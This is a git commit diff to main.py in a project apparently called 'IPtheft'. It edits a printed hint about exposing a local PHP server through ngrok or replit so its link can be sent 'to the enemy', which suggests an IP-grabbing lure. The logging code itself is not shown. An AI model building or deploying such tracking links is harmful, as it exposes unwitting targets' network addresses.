ee4ef55383127330c738d6a49d3dced9bd746451
MixAM333 <76626915+MixAM333@users.noreply.github.com>
2022-02-16 22:00:56 +0700

    IPtheft launch

--- main.py
+++ main.py
@@ -8,7 +8,7 @@ def local():
     port = input("Port?\n> ")
     time.sleep(2)
     print("Succefully! 127.0.0.1:" + str(port))
-    print("If you want to throw this link to the enemy - use ngrok TCP(ngrok.com)")
+    print("If you want to throw this link to the enemy - use ngrok TCP(ngrok.com or replit.com)")
     os.system("php -S 127.0.0.1:" + str(port) + " -f index.php")
 if vo == "local":
     local()
